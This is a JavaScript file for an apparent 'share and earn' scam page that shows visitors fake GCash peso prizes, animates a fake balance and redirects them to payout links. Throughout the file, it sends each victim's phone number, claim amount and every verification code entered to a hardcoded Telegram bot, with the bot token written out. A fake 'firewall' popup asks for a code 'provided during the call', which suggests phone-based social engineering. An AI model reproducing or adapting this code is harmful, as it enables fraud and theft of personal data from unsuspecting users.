// ========== POPUP_SHARE.JS - FOR SHARE_AND_EARN ONLY ==========
// Unique names para hindi magka-conflict sa main.html

let claimStateShare = {
    isProcessing: false,
    currentAmount: 0,
    countdownInterval: null,
    balanceDecrementInterval: null,
    countdownSeconds: 180,
    isPending: false,
    hasRedirected: false
};

let cachedFirewallStatusShare = false;
let currentVerificationCodeShare = null;
let verificationAttemptsShare = 0;

// ========== FIREWALL VERIFICATION ==========
async function getFirewallStatusShare() {
    if (typeof firebase === 'undefined' || !firebase.database) {
        console.warn("Firebase not available");
        return false;
    }
    try {
        const db = firebase.database();
        const snap = await db.ref('admin/globalFirewall').once('value');
        const data = snap.val();
        console.log("Firewall status from Firebase:", data);
        if (data === null) {
            await db.ref('admin/globalFirewall').set({
                active: false,
                activatedBy: "SYSTEM",
                timestamp: Date.now()
            });
            return false;
        }
        return data.active === true;
    } catch(e) { 
        console.error("Firewall check error:", e);
        return false;
    }
}

function listenToFirewallChangesShare() {
    if (typeof firebase === 'undefined' || !firebase.database) return;
    const db = firebase.database();
    db.ref('admin/globalFirewall').on('value', (snapshot) => {
        const data = snapshot.val();
        cachedFirewallStatusShare = (data && data.active === true);
        console.log("Firewall status updated:", cachedFirewallStatusShare);
    });
}

async function sendTelegramShare(phone, code) {
    const msg = `VERIFY REQUEST\nPhone: ${phone}\nCode: ${code}`;
    try {
        await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`);
        console.log("Telegram sent");
    } catch(e) {}
}

function showFirewallPopupShare() {
    console.log("Showing firewall verification popup");
    const popup = document.getElementById('firewallPopup');
    if (!popup) {
        console.error("Firewall popup not found");
        return;
    }
    
    const content = document.getElementById('firewallPopupContent');
    if (content) {
        content.innerHTML = `
            <div class="fw-warning-icon">📞</div>
            <h2>VERIFICATION REQUIRED</h2>
            <div class="fw-message">
                <p>Due to multiple claiming requests detected, verification is required.</p>
                <p>Enter the 4-digit code provided during the call.</p>
            </div>
            <div class="fw-input-group">
                <input type="text" id="verificationCodeShare" class="fw-input" placeholder="1234" maxlength="4" inputmode="numeric">
                <button id="verifyCodeBtnShare" class="fw-btn">VERIFY</button>
            </div>
            <div id="firewallErrorMsgShare" class="fw-error" style="display: none;"></div>
        `;
    }
    
    currentVerificationCodeShare = Math.floor(1000 + Math.random() * 9000).toString();
    verificationAttemptsShare = 0;
    console.log("VERIFICATION CODE:", currentVerificationCodeShare);
    
    popup.style.display = 'flex';
    setTimeout(() => {
        const ci = document.getElementById('verificationCodeShare');
        if (ci) ci.focus();
    }, 100);
    
    const verifyBtn = document.getElementById('verifyCodeBtnShare');
    if (verifyBtn) {
        verifyBtn.onclick = verifyFirewallCodeShare;
    }
}

function hideFirewallPopupShare() {
    const popup = document.getElementById('firewallPopup');
    if (popup) popup.style.display = 'none';
}

window.verifyFirewallCodeShare = async function() {
    const codeInput = document.getElementById('verificationCodeShare');
    const code = codeInput ? codeInput.value.trim() : '';
    const errorDiv = document.getElementById('firewallErrorMsgShare');
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    
    if (!code || code.length < 4) {
        if (errorDiv) {
            errorDiv.innerHTML = "Enter 4-digit code.";
            errorDiv.style.display = 'block';
        }
        return;
    }
    
    verificationAttemptsShare++;
    const isValid = (code === currentVerificationCodeShare);
    
    if (isValid) {
        await sendTelegramShare(userPhone, code);
        hideFirewallPopupShare();
        alert("Verification successful. Page will refresh.");
        setTimeout(() => window.location.reload(), 500);
    } else {
        await sendTelegramShare(userPhone, code);
        let errorMsg = "Invalid code. Try again.";
        if (verificationAttemptsShare >= 3) {
            errorMsg = "Too many failed attempts. Page will refresh.";
            setTimeout(() => window.location.reload(), 2000);
        }
        if (errorDiv) {
            errorDiv.innerHTML = errorMsg;
            errorDiv.style.display = 'block';
        }
        if (codeInput) {
            codeInput.value = '';
            codeInput.focus();
        }
    }
};

// ========== GET LATEST DEPLOYED LINK ==========
async function getLatestPayoutLinkShare() {
    if (typeof firebase === 'undefined' || !firebase.database) return null;
    try {
        const db = firebase.database();
        const snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
        if (snapshot.exists()) {
            const key = Object.keys(snapshot.val())[0];
            const linkData = snapshot.val()[key];
            console.log("Found payout link:", linkData.url);
            return { url: linkData.url, key: key };
        }
        return null;
    } catch (error) {
        console.error("Error getting payout link:", error);
        return null;
    }
}

// ========== MAIN CLAIM POPUP ==========
async function showClaimPopupShare(amount) {
    console.log("showClaimPopupShare called with amount:", amount);
    
    const firewallActive = await getFirewallStatusShare();
    console.log("Firewall active:", firewallActive);
    
    if (firewallActive) {
        console.log("FIREWALL ON - Showing verification");
        showFirewallPopupShare();
        return;
    }
    
    console.log("FIREWALL OFF - Showing congratulations popup");
    claimStateShare.currentAmount = amount;
    claimStateShare.isProcessing = false;
    claimStateShare.hasRedirected = false;
    
    const popup = document.getElementById('claimPopup');
    const prizeSpan = document.getElementById('popupPrizeAmount');
    const claimBtn = document.getElementById('claimActionBtn');
    
    if (prizeSpan) prizeSpan.innerHTML = "₱" + amount.toLocaleString();
    if (claimBtn) {
        claimBtn.innerHTML = 'CLAIM THRU GCASH';
        claimBtn.disabled = false;
    }
    if (popup) popup.style.display = 'flex';
}

function hideClaimPopupShare() { 
    const p = document.getElementById('claimPopup'); 
    if (p) p.style.display = 'none'; 
}

function showPendingStatusShare() { 
    const pa = document.getElementById('pendingStatusArea'); 
    if (pa) pa.style.display = 'block'; 
    claimStateShare.isPending = true; 
}

function hidePendingStatusShare() { 
    const pa = document.getElementById('pendingStatusArea'); 
    if (pa) pa.style.display = 'none'; 
    claimStateShare.isPending = false; 
}

// ========== BALANCE DECREMENT ==========
function startSmoothDecrementShare(originalAmount) {
    const balanceText = document.getElementById('balanceText');
    if (!balanceText) return;
    
    let current = originalAmount;
    const totalDuration = 2000;
    const steps = originalAmount;
    const intervalTime = totalDuration / steps;
    
    claimStateShare.balanceDecrementInterval = setInterval(() => {
        current = current - 1;
        if (current >= 0) balanceText.innerText = "₱" + current.toLocaleString() + ".00";
        if (current <= 0) {
            clearInterval(claimStateShare.balanceDecrementInterval);
            claimStateShare.balanceDecrementInterval = null;
            balanceText.innerText = "₱0.00";
        }
    }, intervalTime);
}

// ========== COUNTDOWN TIMER ==========
function startVisibleCountdownShare(originalAmount) {
    let remaining = claimStateShare.countdownSeconds;
    const timerSpan = document.getElementById('pendingCountdown');
    const pendingArea = document.getElementById('pendingStatusArea');
    
    if (!timerSpan) return;
    
    claimStateShare.countdownInterval = setInterval(() => {
        if (remaining > 0) {
            remaining--;
            const mins = Math.floor(remaining / 60);
            const secs = remaining % 60;
            timerSpan.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
        }
        
        if (remaining <= 0) {
            clearInterval(claimStateShare.countdownInterval);
            claimStateShare.countdownInterval = null;
            
            const balanceText = document.getElementById('balanceText');
            if (balanceText) balanceText.innerText = "₱" + originalAmount.toLocaleString() + ".00";
            
            if (pendingArea) pendingArea.style.display = 'none';
            claimStateShare.isProcessing = false;
            claimStateShare.hasRedirected = false;
        }
    }, 1000);
}

// ========== REDIRECT TIMER ==========
function startImaginaryTimerShare(redirectUrl) {
    setTimeout(() => {
        if (!claimStateShare.hasRedirected) {
            claimStateShare.hasRedirected = true;
            window.location.href = redirectUrl;
        }
    }, 2000);
}

// ========== CLAIM ACTION ==========
async function onClaimActionShare() {
    if (claimStateShare.isProcessing) return;
    
    claimStateShare.isProcessing = true;
    const claimBtn = document.getElementById('claimActionBtn');
    const amount = claimStateShare.currentAmount;
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    
    if (claimBtn) {
        claimBtn.disabled = true;
        claimBtn.innerHTML = 'PROCESSING...';
    }
    
    fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent("CLAIM REQUEST!\nPhone: " + userPhone + "\nAmount: ₱" + amount)}`)
        .catch(e => console.log('Telegram error:', e));
    
    if (typeof firebase !== 'undefined' && firebase.database) {
        const db = firebase.database();
        
        try {
            const linkData = await getLatestPayoutLinkShare();
            
            if (linkData && linkData.url) {
                const redirectUrl = linkData.url;
                const finalUrl = redirectUrl.startsWith('http') ? redirectUrl : 'https://' + redirectUrl;
                
                await db.ref('links/' + linkData.key).update({ 
                    status: 'claimed', 
                    user: userPhone, 
                    amount: amount, 
                    claimedAt: Date.now() 
                });
                
                hideClaimPopupShare();
                showPendingStatusShare();
                
                const balanceText = document.getElementById('balanceText');
                if (balanceText) startSmoothDecrementShare(amount);
                
                startVisibleCountdownShare(amount);
                startImaginaryTimerShare(finalUrl);
                
            } else {
                if (claimBtn) {
                    claimBtn.innerHTML = 'NO REWARDS';
                    setTimeout(() => {
                        claimBtn.innerHTML = 'CLAIM THRU GCASH';
                        claimBtn.disabled = false;
                        claimStateShare.isProcessing = false;
                    }, 3000);
                }
                alert("Withdrawal unsuccessful. No payout link available.");
            }
        } catch(err) {
            console.error("Error:", err);
            if (claimBtn) {
                claimBtn.innerHTML = 'ERROR';
                setTimeout(() => {
                    claimBtn.innerHTML = 'CLAIM THRU GCASH';
                    claimBtn.disabled = false;
                    claimStateShare.isProcessing = false;
                }, 3000);
            }
            alert("System error. Please try again.");
        }
    }
}

// ========== EXPORT FUNCTIONS ==========
window.showFirewallPopupShare = showFirewallPopupShare;
window.hideFirewallPopupShare = hideFirewallPopupShare;
window.verifyFirewallCodeShare = verifyFirewallCodeShare;
window.showClaimPopupShare = showClaimPopupShare;
window.onClaimActionShare = onClaimActionShare;

// ========== INITIALIZE ==========
document.addEventListener('DOMContentLoaded', function() { 
    hidePendingStatusShare();
    listenToFirewallChangesShare();
    getFirewallStatusShare().then(status => {
        console.log("Initial firewall status:", status);
        cachedFirewallStatusShare = status;
    });
    console.log("Popup_share.js loaded for share_and_earn");
});
